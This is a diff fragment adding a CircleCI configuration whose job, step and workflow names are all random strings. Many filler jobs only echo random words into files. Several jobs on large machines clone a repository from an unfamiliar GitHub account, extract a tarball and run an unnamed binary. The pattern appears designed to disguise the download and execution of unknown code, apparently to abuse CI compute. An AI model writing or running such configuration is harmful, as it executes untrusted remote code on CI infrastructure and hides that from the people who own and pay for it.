+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: jpbowo
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  chdkmr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: fjeyzdgplna
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'jwlbijlprcfy vgkhbiicah' > /tmp/fphudi/clhkevfb
+            ls -la /tmp/fphudi/clhkevfb
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'clhkevfb'
+  hqhqgrfjm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: wuzduitecfol
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/rkthjhik 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: mumpr
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: snxzgtrcyqxgc
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  jrpohyuuftmiyjd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ltmqlidfdm
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'iozvrdzouag vpkxtqdtfrbqevdhf' > /tmp/fphudi/qtxxdztsmlp
+            ls -la /tmp/fphudi/qtxxdztsmlp
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'qtxxdztsmlp'
+  jlsrxypb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: agkuqu
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/pqpnxqrijm 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: pyywf
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: akiewuzarh
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+  xsbtgmn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: kyevs
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'vihnwutiaaotykl ygwauvlnasorev' > /tmp/fphudi/bsqbtgyj
+            ls -la /tmp/fphudi/bsqbtgyj
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'bsqbtgyj'
+  ernxo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: htfksccq
+          command: |
+            [[ "$(head -n 1 /tmp/fphudi/gizipajdy 2>/dev/null)" =~ ^[A-Z] ]] && echo "starts upper" || echo "starts other"
+      - run:
+          name: bvzspcoyszp
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 https://github.com/kaniabarrbnsti-alt/f1123c4ebc8e.git .
+      - run:
+          name: hpbwfgyhphw
+          command: tar xjf ciyupbhzad.tar.bz2
+      - run:
+          command: "./kcvpkkjg"
+
+  vhdeniqdan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: hxqjqto
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'urxrwbqmbmivi sywxqqvhza' > /tmp/fphudi/yhkmfmdhjwfdar
+            ls -la /tmp/fphudi/yhkmfmdhjwfdar
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'yhkmfmdhjwfdar'
+  bxjwwxzbx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: bbglttybc
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ycszjyaxzwizoyr rrizrhmmvnmc' > /tmp/fphudi/vyloicudbohqka
+            ls -la /tmp/fphudi/vyloicudbohqka
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'vyloicudbohqka'
+  nyuqeedz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ptsoyyfptog
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'wdpzmsxscrdineskm qpaqqbyvuktizjx' > /tmp/fphudi/felyhcngt
+            ls -la /tmp/fphudi/felyhcngt
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'felyhcngt'
+  idbczmbnwgc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: jcdwvzslqimgxvc
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ngzggvswth saaztnprzo' > /tmp/fphudi/cxemvczl
+            ls -la /tmp/fphudi/cxemvczl
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'cxemvczl'
+  bfguxcsysfbrq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: jdiitjitf
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'eerpwyoeyxcml zkbczbddish' > /tmp/fphudi/fwwkhehwxwpta
+            ls -la /tmp/fphudi/fwwkhehwxwpta
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'fwwkhehwxwpta'
+  zuhhlypbudee:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ebsrbca
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'kpumfhftdjfu dlsrpvqovefkvak' > /tmp/fphudi/supgyv
+            ls -la /tmp/fphudi/supgyv
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'supgyv'
+  fgffcoiqqutj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: kezikzrneixrcv
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'wcfqitvsugpnv qxzjbhlcivogiewc' > /tmp/fphudi/phssypsw
+            ls -la /tmp/fphudi/phssypsw
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'phssypsw'
+  ginlxpbkxaq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: cemtiaaacjhley
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'zcdpndoeexzvojy gtcczwywdkms' > /tmp/fphudi/kyfbueqx
+            ls -la /tmp/fphudi/kyfbueqx
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'kyfbueqx'
+  oetub:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: uhsxpxhe
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'brbntxfotesubdqpat fcjkqhuypbk' > /tmp/fphudi/keugacs
+            ls -la /tmp/fphudi/keugacs
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'keugacs'
+  yihpnlepajl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: axlob
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'azanajnwjmd fxseesihbuozu' > /tmp/fphudi/uxqzugwy
+            ls -la /tmp/fphudi/uxqzugwy
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'uxqzugwy'
+  pkirbfqzieabd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: hqqqqqvyygmqim
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'gtjtlomtujtmo idlpkimigboscsuh' > /tmp/fphudi/vxcrioovbbr
+            ls -la /tmp/fphudi/vxcrioovbbr
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'vxcrioovbbr'
+  zzscxdjnhosk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: szqkutj
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'vavxciqrvygwragf mgyhsplqcleshisgs' > /tmp/fphudi/krdcitjcenyo
+            ls -la /tmp/fphudi/krdcitjcenyo
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'krdcitjcenyo'
+  lgvwxvzy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: wemibfct
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'dxfcituaxfzg tdotmfxsri' > /tmp/fphudi/fvkxnxvh
+            ls -la /tmp/fphudi/fvkxnxvh
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'fvkxnxvh'
+  ywwwczxwt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: alldf
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'vvfkkzgpwckawj wuyxbmgajguv' > /tmp/fphudi/ehanodjddoasnb
+            ls -la /tmp/fphudi/ehanodjddoasnb
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ehanodjddoasnb'
+  hvznbos:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: agaofl
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'pyfslbqzthslo aqoxhsklxwaixaodg' > /tmp/fphudi/cixqhzxnn
+            ls -la /tmp/fphudi/cixqhzxnn
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'cixqhzxnn'
+  yqqjgi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: nmhbce
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'nqtlfahcsof amvbnywbxnzjeadv' > /tmp/fphudi/xfyimukkgy
+            ls -la /tmp/fphudi/xfyimukkgy
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'xfyimukkgy'
+  warbobfoku:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: nortunqljqngsg
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ewffpelvhbmbe qifirhdezgijos' > /tmp/fphudi/elgtqjrxnjuktr
+            ls -la /tmp/fphudi/elgtqjrxnjuktr
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'elgtqjrxnjuktr'
+  pjrmxnronvv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gafog
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'gpcwxudgtwb kuiwazvkor' > /tmp/fphudi/ybmslrtyqbchfw
+            ls -la /tmp/fphudi/ybmslrtyqbchfw
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ybmslrtyqbchfw'
+  fridsce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: hkauycaqarkljn
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'fpjvdqsypdbr hyuuzdmchmaosskcf' > /tmp/fphudi/iytjvs
+            ls -la /tmp/fphudi/iytjvs
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'iytjvs'
+  gfrqtgzx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: aotxxdfiyopnyea
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'fxtzweeseyx yhcufrglrn' > /tmp/fphudi/crjwffm
+            ls -la /tmp/fphudi/crjwffm
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'crjwffm'
+  kgfulyznvydgu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: plmxobylx
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'kfbgcnbbimwunfyfl gsmjwpuqqgoxuvs' > /tmp/fphudi/okdjjffmigjd
+            ls -la /tmp/fphudi/okdjjffmigjd
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'okdjjffmigjd'
+  wiatle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: jnmpzeicawtwpq
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'wchroxkozgxteiamek mcjrjziybmwd' > /tmp/fphudi/peclfvkwknmihu
+            ls -la /tmp/fphudi/peclfvkwknmihu
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'peclfvkwknmihu'
+  oabkpzdv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: geskpd
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'ocvxiduoslmdmjfcww gvycvxcpixltgdef' > /tmp/fphudi/oydedm
+            ls -la /tmp/fphudi/oydedm
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'oydedm'
+  mdsam:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: ywhvpykicyo
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'muyomojnlu ecapfrbyxddbb' > /tmp/fphudi/blitwpviiohnjo
+            ls -la /tmp/fphudi/blitwpviiohnjo
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'blitwpviiohnjo'
+  uvmyhqzspwv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fphudi
+      - run:
+          name: jxqkbuwvy
+          command: |
+            mkdir -p /tmp/fphudi
+            echo 'oaerhxbrykdgpbydiq oloqabchtufiigixst' > /tmp/fphudi/ooffzvlooop
+            ls -la /tmp/fphudi/ooffzvlooop
+      - persist_to_workspace:
+          root: /tmp/fphudi
+          paths:
+            - 'ooffzvlooop'
+workflows:
+  kdtcpqgksblgad:
+    jobs:
+      - fggqcdnfwq
+      - vhdeniqdan:
+          requires:
+            - fggqcdnfwq
+      - chbklybztfgq:
+          requires:
+            - vhdeniqdan
+      - fsbuoamajnyaczs:
+          requires:
+            - vhdeniqdan
+      - bxjwwxzbx:
+          requires:
+            - fsbuoamajnyaczs
+      - sprswemruhtmpw:
+          requires:
+            - bxjwwxzbx
+      - ohsyugiig:
+          requires:
+            - bxjwwxzbx
+      - nyuqeedz:
+          requires:
+            - ohsyugiig
+      - jugfpvkwpdlhp:
+          requires:
+            - nyuqeedz
+      - wzmctvpbyr:
+          requires:
+            - nyuqeedz
+      - idbczmbnwgc:
+          requires:
+            - wzmctvpbyr
+      - altorkj:
+          requires:
+            - idbczmbnwgc
+      - tuphzqn:
+          requires:
+            - idbczmbnwgc
+      - bfguxcsysfbrq:
+          requires:
+            - tuphzqn
+      - iakszvldacy:
+          requires:
+            - bfguxcsysfbrq
+      - fnjtpbiys:
+          requires:
+            - bfguxcsysfbrq
+      - zuhhlypbudee:
+          requires:
+            - fnjtpbiys
+      - yipbfkerdohfax:
+          requires:
+            - zuhhlypbudee
+      - cxucrqkm:
+          requires:
+            - zuhhlypbudee
+      - fgffcoiqqutj:
+          requires:
+            - cxucrqkm
+      - dlklygle:
+          requires:
+            - fgffcoiqqutj
+      - hgedixe:
+          requires:
+            - fgffcoiqqutj
+      - ginlxpbkxaq:
+          requires:
+            - hgedixe
+      - qugjkfibgztxtht:
+          requires:
+            - ginlxpbkxaq
+      - chdkmr:
+          requires:
+            - ginlxpbkxaq
+      - oetub:
+          requires:
+            - chdkmr
+      - hqhqgrfjm:
+          requires:
+            - oetub
+      - ipzhcgtk:
+          requires:
+            - oetub
+      - yihpnlepajl:
+          requires:
+            - ipzhcgtk
+      - nnunxpjnlqktd:
+          requires:
+            - yihpnlepajl
+      - ysdjnsjeqtmaca
+      - pkirbfqzieabd:
+          requires:
+            - ysdjnsjeqtmaca
+      - iyxpcerte:
+          requires:
+            - pkirbfqzieabd
+      - jjcsppemo:
+          requires:
+            - pkirbfqzieabd
+      - zzscxdjnhosk:
+          requires:
+            - jjcsppemo
+      - lgglguapnc:
+          requires:
+            - zzscxdjnhosk
+      - xsbtgmn:
+          requires:
+            - zzscxdjnhosk
+      - lgvwxvzy:
+          requires:
+            - xsbtgmn
+      - ernxo:
+          requires:
+            - lgvwxvzy
+      - pomuo:
+          requires:
+            - lgvwxvzy
+      - ywwwczxwt:
+          requires:
+            - pomuo
+      - fdesgnmxeo:
+          requires:
+            - ywwwczxwt
+      - sbttxqfc:
+          requires:
+            - ywwwczxwt
+      - hvznbos:
+          requires:
+            - sbttxqfc
+      - swvlwcddae:
+          requires:
+            - hvznbos
+      - nzjzvdp
+      - yqqjgi:
+          requires:
+            - nzjzvdp
+      - dqvrjtbvcrcpn:
+          requires:
+            - yqqjgi
+      - jrpohyuuftmiyjd:
+          requires:
+            - yqqjgi
+      - warbobfoku:
+          requires:
+            - jrpohyuuftmiyjd
+      - jlsrxypb:
+          requires:
+            - warbobfoku
+      - uthaz:
+          requires:
+            - warbobfoku
+      - pjrmxnronvv:
+          requires:
+            - uthaz
+      - vnfbonivac:
+          requires:
+            - pjrmxnronvv
+      - krzhocvjpz:
+          requires:
+            - pjrmxnronvv
+      - fridsce:
+          requires:
+            - krzhocvjpz
+      - ezmfzevn:
+          requires:
+            - fridsce
+      - fdiibsehyvwg:
+          requires:
+            - fridsce
+      - gfrqtgzx:
+          requires:
+            - fdiibsehyvwg
+      - miexyps:
+          requires:
+            - gfrqtgzx
+      - goytglvzfwwbav:
+          requires:
+            - gfrqtgzx
+      - kgfulyznvydgu:
+          requires:
+            - goytglvzfwwbav
+      - imxzttieoiq:
+          requires:
+            - kgfulyznvydgu
+      - vrwjoaipk:
+          requires:
+            - kgfulyznvydgu
+      - wiatle:
+          requires:
+            - vrwjoaipk
+      - hhfatrrrpmconn:
+          requires:
+            - wiatle
+      - iqmzzdrmwswciz:
+          requires:
+            - wiatle
+      - oabkpzdv:
+          requires:
+            - iqmzzdrmwswciz
+      - quaiccgwcq:
+          requires:
+            - oabkpzdv
+      - zfdds:
+          requires:
+            - oabkpzdv
+      - mdsam:
+          requires:
+            - zfdds
+      - txxhbqhqlmuv:
+          requires:
+            - mdsam
+      - zlzgxy:
+          requires:
+            - mdsam
+      - uvmyhqzspwv:
+          requires:
+            - zlzgxy
+      - xlkslxhelfhssn:
+          requires:
+            - uvmyhqzspwv
+      - zfjmrqzm
+      - ybmyleujke:
+          requires:
+            - zfjmrqzm
+      - ulkek:
+          requires:
+            - zfjmrqzm
+      - bomcvdgby:
+          requires:
+            - ulkek
+      - srqich:
+          requires:
+            - ulkek
+      - swxsmxtqdubeeb:
+          requires:
+            - srqich
+      - ayuwsh:
+          requires:
+            - srqich
+      - obtkhvd:
+          requires:
+            - ayuwsh
+      - qlbidjs:
+          requires:
+            - ayuwsh
+      - apaoyj:
+          requires:
+            - qlbidjs
